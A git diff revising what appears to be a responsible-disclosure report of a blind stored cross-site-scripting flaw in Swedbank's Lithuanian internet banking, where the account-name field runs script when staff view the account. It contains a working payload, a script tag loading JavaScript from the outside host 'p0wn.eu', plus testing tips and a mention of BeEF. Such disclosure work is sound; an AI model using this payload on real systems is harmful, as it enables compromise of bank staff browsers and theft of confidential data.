@@ -1,28 +1,30 @@
-SWEDBANK: Blind Stored Cross-Site-Scripting in Retail Banking
+SWEDBANK: Blind Stored Cross-Site-Scripting (XSS) in Retail Banking
 =============================================================
 
 Description
 -----------
-A regular authenticated internet banking user has an option to set a bank’s account name to anything arbitrary with a char limit of 35. The internet banking application hosted at https://www.swedbank.lt/private is vulnerable to a blind Stored Cross-Site-Scripting attack in the account's name field. 
-A malicious actor can set a specially crafted payload and store it for a blind attack on the bank's staff. It is possible that other system’s users (banking personnel, call centre stuff etc.) who work regularly with retail customers could “find” this malicious payload while observing a specific account through routine tasks or on demand calls. This would lead to compromise other users and elevate privileges for an attacker.
+Regular authenticated internet banking users can include arbitrary input within bank’s account name. 
+This makes internet banking application hosted at https://www.swedbank.lt/private vulnerable to a blind Stored Cross-Site-Scripting attack (XSS). 
+
+A malicious actor would first place arbitrary javascript payload within their bank account name. 
+Once it is accessed by another party - for example banking personnel, call centre stuff etc. attacker-controlled javascript code would be executed within the context of the victim browser.
+This could then be used to both leak confidential information and perform escalation of privillege attacks.
 
 Proof-of-Concept
 ----------------
-Authenticate to the web application at:
-https://www.swedbank.lt/private
 
-Then open the bank’s account setting page at:
+Authenticate to the web application and open the bank’s account setting page at:
 https://www.swedbank.lt/private/home/important/aliases
+
 `pageId = private.home.important.aliases`
 
-Then change any account name to this payload:
+Include following javascript code within your bank account name and save changes:
 ```
 A<script src=“//p0wn.eu”></script>
 ```
-And save the user input form.
 
-*Note* To make an isolated check from external network a simple hint can be used:
-Point any short domain with a name like `p0wn.eu` and write an IP resolution into the system’s `hosts` file. Then host any JS payload on the HTTPS web server.
+*Note* To make an isolated check from external network a simple trick can be used:
+Point domain used within payload to the IP address you control and save the entry within system’s `hosts` file. Then host any JS payload on the HTTPS web server.
 
 Next a user (a victim) must visit the following page from the main menu:
 ```
@@ -61,7 +63,7 @@ Desktop (browser):
 Mobile:
 ![Stored XSS attack on mobile app](https://i.imgur.com/4bezvvo.jpeg)
 
-The issue with unfiltered user input and fail to sanitise output in the web content can lead to high security incidents since an attacker can invoke and launch various JS scripts or JS frameworks like BeEF (The Browser Exploitation Framework https://beefproject.com/) in the context of a user or other system’s users (banking personnel, call center stuff etc.) who work regularly with retail clients.
+Unfiltered user input and failure to sanitize output in the web content leads to high security incidents since an attacker can invoke and launch various JS scripts or JS frameworks like BeEF (The Browser Exploitation Framework https://beefproject.com/) in the context of a user or other system’s users (banking personnel, call center stuff etc.) browser.
 
 Payload of the server's `p0wn.eu` content:
 ```
